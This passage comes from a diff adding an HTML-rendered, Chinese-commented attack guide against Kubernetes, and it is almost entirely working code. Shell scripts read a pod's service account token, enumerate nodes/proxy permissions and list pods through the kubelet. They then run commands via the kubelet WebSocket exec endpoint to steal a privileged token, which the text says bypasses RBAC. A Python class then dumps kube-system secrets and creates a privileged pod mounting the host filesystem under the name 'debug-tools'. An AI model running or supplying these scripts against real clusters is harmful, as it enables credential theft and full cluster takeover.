+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Token (first 50 chars): </span><span class="si">${</span><span class="nv">TOKEN</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">50</span><span class="si">}</span><span class="s2">...&quot;</span>
+
+<span class="c1"># 解码 JWT 查看 payload</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39;.&#39;</span><span class="w"> </span>-f2<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>.<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="se">\</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39;.&#39;</span><span class="w"> </span>-f2<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 枚举当前权限</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Checking permissions...&quot;</span>
+kubectl<span class="w"> </span>auth<span class="w"> </span>can-i<span class="w"> </span>--list<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="se">\</span>
+curl<span class="w"> </span>-sk<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--cacert<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$CACERT</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;</span><span class="nv">$APISERVER</span><span class="s2">/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;apiVersion&quot;:&quot;authorization.k8s.io/v1&quot;,&quot;kind&quot;:&quot;SelfSubjectRulesReview&quot;,&quot;spec&quot;:{&quot;namespace&quot;:&quot;default&quot;}}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>jq<span class="w"> </span><span class="s1">&#39;.status.resourceRules[] | select(.resources[] | contains(&quot;nodes/proxy&quot;))&#39;</span>
+
+<span class="c1"># 关键输出:</span>
+<span class="c1"># resources: [&quot;nodes/proxy&quot;]  verbs: [&quot;get&quot;]</span>
+<span class="c1"># → 有 nodes/proxy GET 权限, 攻击可行!</span>
+
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] Permission check complete&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] If nodes/proxy GET is listed, exploitation is possible&quot;</span>
+</code></pre></div>
+
+<h3>2.3 Step 2：获取 Node IP</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># step2_get_node_ip.sh</span>
+
+<span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>/var/run/secrets/kubernetes.io/serviceaccount/token<span class="k">)</span>
+<span class="nv">APISERVER</span><span class="o">=</span>https://kubernetes.default.svc
+<span class="nv">CACERT</span><span class="o">=</span>/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+<span class="c1"># 方法 1: 通过 Downward API (如果 Pod 配置了)</span>
+<span class="nv">NODE_NAME</span><span class="o">=</span><span class="si">${</span><span class="nv">MY_NODE_NAME</span><span class="k">:-$(</span>hostname<span class="k">)</span><span class="si">}</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Node name: </span><span class="nv">$NODE_NAME</span><span class="s2">&quot;</span>
+
+<span class="c1"># 方法 2: 通过 API Server 查询 Node 信息</span>
+<span class="nv">NODE_IP</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-sk<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--cacert<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$CACERT</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;</span><span class="nv">$APISERVER</span><span class="s2">/api/v1/nodes/</span><span class="nv">$NODE_NAME</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.status.addresses[] | select(.type==&quot;InternalIP&quot;).address&#39;</span><span class="k">)</span>
+
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Node Internal IP: </span><span class="nv">$NODE_IP</span><span class="s2">&quot;</span>
+
+<span class="c1"># 方法 3: 如果在监控 Pod 中, 从 /pods 端点提取</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-z<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NODE_IP</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Trying to get Node IP from /pods endpoint...&quot;</span>
+<span class="w">    </span><span class="nv">NODE_IP</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-sk<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>--cacert<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$CACERT</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">      </span><span class="s2">&quot;</span><span class="nv">$APISERVER</span><span class="s2">/api/v1/nodes/</span><span class="nv">$NODE_NAME</span><span class="s2">/proxy/pods&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.items[0].status.hostIP&#39;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Node IP from /pods: </span><span class="nv">$NODE_IP</span><span class="s2">&quot;</span>
+<span class="k">fi</span>
+
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] Target Kubelet: https://</span><span class="nv">$NODE_IP</span><span class="s2">:10250&quot;</span>
+</code></pre></div>
+
+<h3>2.4 Step 3：枚举目标 Pod</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># step3_enumerate_pods.sh</span>
+
+<span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>/var/run/secrets/kubernetes.io/serviceaccount/token<span class="k">)</span>
+<span class="nv">NODE_IP</span><span class="o">=</span><span class="s2">&quot;&lt;目标Node IP&gt;&quot;</span>
+
+<span class="c1"># 通过 Kubelet /pods 端点列出所有 Pod</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Enumerating pods on node...&quot;</span>
+<span class="nv">PODS_JSON</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-sk<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;https://</span><span class="nv">$NODE_IP</span><span class="s2">:10250/pods&quot;</span><span class="k">)</span>
+
+<span class="c1"># 解析并优先显示 kube-system 中的特权 Pod</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PODS_JSON</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;</span>
+<span class="s1">.items[] | </span>
+<span class="s1">select(.metadata.namespace == &quot;kube-system&quot;) |</span>
+<span class="s1">&quot;NS: \(.metadata.namespace)  POD: \(.metadata.name)  CONTAINER: \(.spec.containers[0].name)  SA: \(.spec.serviceAccountName)  HOST_NET: \(.spec.hostNetwork // false)  HOST_PID: \(.spec.hostPID // false)&quot;</span>
+<span class="s1">&#39;</span>
+
+<span class="c1"># 优先目标:</span>
+<span class="c1"># 1. kube-proxy (通常有 hostNetwork: true, 高权限 SA)</span>
+<span class="c1"># 2. controller-manager (cluster-admin 级别 SA)</span>
+<span class="c1"># 3. 任何 hostPID/hostNetwork 的 Pod</span>
+
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] All pods on this node:&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PODS_JSON</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;</span>
+<span class="s1">.items[] |</span>
+<span class="s1">&quot;NS: \(.metadata.namespace)  POD: \(.metadata.name)  CONTAINER: \(.spec.containers[0].name)&quot;</span>
+<span class="s1">&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+</code></pre></div>
+
+<h3>2.5 Step 4：WebSocket 命令执行</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># step4_websocket_exec.sh</span>
+
+<span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>/var/run/secrets/kubernetes.io/serviceaccount/token<span class="k">)</span>
+<span class="nv">NODE_IP</span><span class="o">=</span><span class="s2">&quot;&lt;目标Node IP&gt;&quot;</span>
+
+<span class="c1"># 目标: kube-system 中的 kube-proxy Pod</span>
+<span class="nv">TARGET_NS</span><span class="o">=</span><span class="s2">&quot;kube-system&quot;</span>
+<span class="nv">TARGET_POD</span><span class="o">=</span><span class="s2">&quot;kube-proxy-xxxxx&quot;</span><span class="w">  </span><span class="c1"># 从 Step 3 获取</span>
+<span class="nv">TARGET_CONTAINER</span><span class="o">=</span><span class="s2">&quot;kube-proxy&quot;</span>
+
+<span class="c1"># 执行命令: 读取 ServiceAccount Token</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Executing command via WebSocket...&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Target: </span><span class="nv">$TARGET_NS</span><span class="s2">/</span><span class="nv">$TARGET_POD</span><span class="s2">/</span><span class="nv">$TARGET_CONTAINER</span><span class="s2">&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Command: cat /var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+
+<span class="c1"># 使用 websocat 进行 WebSocket exec</span>
+<span class="c1"># 关键: 使用 wss:// 协议, GET 握手绕过 RBAC</span>
+websocat<span class="w"> </span>--insecure<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--header<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--protocol<span class="w"> </span><span class="s2">&quot;v4.channel.k8s.io&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;wss://</span><span class="nv">$NODE_IP</span><span class="s2">:10250/exec/</span><span class="nv">$TARGET_NS</span><span class="s2">/</span><span class="nv">$TARGET_POD</span><span class="s2">/</span><span class="nv">$TARGET_CONTAINER</span><span class="s2">?output=1&amp;error=1&amp;command=cat&amp;command=/var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span>
+
+<span class="c1"># 输出: kube-proxy 的 ServiceAccount Token</span>
+<span class="c1"># 这个 Token 通常有 cluster-admin 或接近的权限!</span>
+
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Alternative: execute id command&quot;</span>
+websocat<span class="w"> </span>--insecure<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--header<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--protocol<span class="w"> </span><span class="s2">&quot;v4.channel.k8s.io&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;wss://</span><span class="nv">$NODE_IP</span><span class="s2">:10250/exec/</span><span class="nv">$TARGET_NS</span><span class="s2">/</span><span class="nv">$TARGET_POD</span><span class="s2">/</span><span class="nv">$TARGET_CONTAINER</span><span class="s2">?output=1&amp;error=1&amp;command=id&quot;</span>
+
+<span class="c1"># 输出: uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="c1"># kube-proxy 通常以 root 运行!</span>
+</code></pre></div>
+
+<h3>2.6 Step 5：提权到集群管理员</h3>
+<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">Step 5: 使用从特权 Pod 偷取的 Token 提权到集群管理员</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">urllib.request</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">ssl</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">K8sPrivilegeEscalation</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;K8s 提权到集群管理员&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">stolen_token</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">api_server</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">token</span> <span class="o">=</span> <span class="n">stolen_token</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">api_server</span> <span class="o">=</span> <span class="n">api_server</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">check_hostname</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">verify_mode</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">check_permissions</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;检查偷来的 Token 有什么权限&quot;&quot;&quot;</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">api_server</span><span class="si">}</span><span class="s2">/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&quot;</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
+            <span class="s2">&quot;apiVersion&quot;</span><span class="p">:</span> <span class="s2">&quot;authorization.k8s.io/v1&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;kind&quot;</span><span class="p">:</span> <span class="s2">&quot;SelfSubjectRulesReview&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;spec&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;namespace&quot;</span><span class="p">:</span> <span class="s2">&quot;kube-system&quot;</span><span class="p">}</span>
+        <span class="p">})</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+        <span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Authorization&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/json&quot;</span><span class="p">)</span>
+
+        <span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">context</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">)</span>
+        <span class="n">rules</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+
+        <span class="c1"># 检查是否有 cluster-admin 级别权限</span>
+        <span class="k">for</span> <span class="n">rule</span> <span class="ow">in</span> <span class="n">rules</span><span class="p">[</span><span class="s2">&quot;status&quot;</span><span class="p">][</span><span class="s2">&quot;resourceRules&quot;</span><span class="p">]:</span>
+            <span class="k">if</span> <span class="s2">&quot;*&quot;</span> <span class="ow">in</span> <span class="n">rule</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;verbs&quot;</span><span class="p">,</span> <span class="p">[])</span> <span class="ow">and</span> <span class="s2">&quot;*&quot;</span> <span class="ow">in</span> <span class="n">rule</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;resources&quot;</span><span class="p">,</span> <span class="p">[]):</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[!] CLUSTER ADMIN ACCESS DETECTED!&quot;</span><span class="p">)</span>
+                <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;cluster_admin&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;rule&quot;</span><span class="p">:</span> <span class="n">rule</span><span class="p">}</span>
+
+        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;cluster_admin&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;rules&quot;</span><span class="p">:</span> <span class="n">rules</span><span class="p">[</span><span class="s2">&quot;status&quot;</span><span class="p">][</span><span class="s2">&quot;resourceRules&quot;</span><span class="p">]}</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">steal_secrets</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;窃取 kube-system 中的所有 Secrets&quot;&quot;&quot;</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">api_server</span><span class="si">}</span><span class="s2">/api/v1/namespaces/kube-system/secrets&quot;</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Authorization&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">context</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">)</span>
+        <span class="n">secrets</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+
+        <span class="n">stolen</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">secret</span> <span class="ow">in</span> <span class="n">secrets</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;items&quot;</span><span class="p">,</span> <span class="p">[]):</span>
+            <span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+            <span class="n">name</span> <span class="o">=</span> <span class="n">secret</span><span class="p">[</span><span class="s2">&quot;metadata&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">]</span>
+            <span class="k">if</span> <span class="s2">&quot;token&quot;</span> <span class="ow">in</span> <span class="n">name</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">or</span> <span class="s2">&quot;cert&quot;</span> <span class="ow">in</span> <span class="n">name</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">secret</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="p">{})</span>
+                <span class="n">decoded</span> <span class="o">=</span> <span class="p">{}</span>
+                <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+                    <span class="n">decoded</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&quot;replace&quot;</span><span class="p">)</span>
+                <span class="n">stolen</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span> <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="n">secret</span><span class="p">[</span><span class="s2">&quot;type&quot;</span><span class="p">],</span> <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="n">decoded</span><span class="p">})</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Stolen secret: </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">stolen</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">create_privileged_pod</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;创建特权 Pod 挂载宿主机文件系统&quot;&quot;&quot;</span>
+        <span class="n">pod_manifest</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&quot;apiVersion&quot;</span><span class="p">:</span> <span class="s2">&quot;v1&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;kind&quot;</span><span class="p">:</span> <span class="s2">&quot;Pod&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;metadata&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;debug-tools&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;namespace&quot;</span><span class="p">:</span> <span class="s2">&quot;default&quot;</span>
+            <span class="p">},</span>
+            <span class="s2">&quot;spec&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s2">&quot;hostPID&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+                <span class="s2">&quot;hostNetwork&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+                <span class="s2">&quot;containers&quot;</span><span class="p">:</span> <span class="p">[{</span>
+                    <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;debug&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;image&quot;</span><span class="p">:</span> <span class="s2">&quot;alpine:3.18&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;command&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">,</span> <span class="s2">&quot;sleep 3600&quot;</span><span class="p">],</span>
+                    <span class="s2">&quot;securityContext&quot;</span><span class="p">:</span> <span class="p">{</span>
+                        <span class="s2">&quot;privileged&quot;</span><span class="p">:</span> <span class="kc">True</span>
+                    <span class="p">},</span>
+                    <span class="s2">&quot;volumeMounts&quot;</span><span class="p">:</span> <span class="p">[{</span>
+                        <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;host-root&quot;</span><span class="p">,</span>
+                        <span class="s2">&quot;mountPath&quot;</span><span class="p">:</span> <span class="s2">&quot;/host&quot;</span>
+                    <span class="p">}]</span>
+                <span class="p">}],</span>
+                <span class="s2">&quot;volumes&quot;</span><span class="p">:</span> <span class="p">[{</span>
+                    <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;host-root&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;hostPath&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;path&quot;</span><span class="p">:</span> <span class="s2">&quot;/&quot;</span><span class="p">}</span>
+                <span class="p">}]</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">api_server</span><span class="si">}</span><span class="s2">/api/v1/namespaces/default/pods&quot;</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">pod_manifest</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+        <span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Authorization&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/json&quot;</span><span class="p">)</span>
+
+        <span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">context</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+
+        <span class="n">pod_name</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&quot;metadata&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Privileged pod created: </span><span class="si">{</span><span class="n">pod_name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Access host filesystem at /host&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">pod_name</span>
+
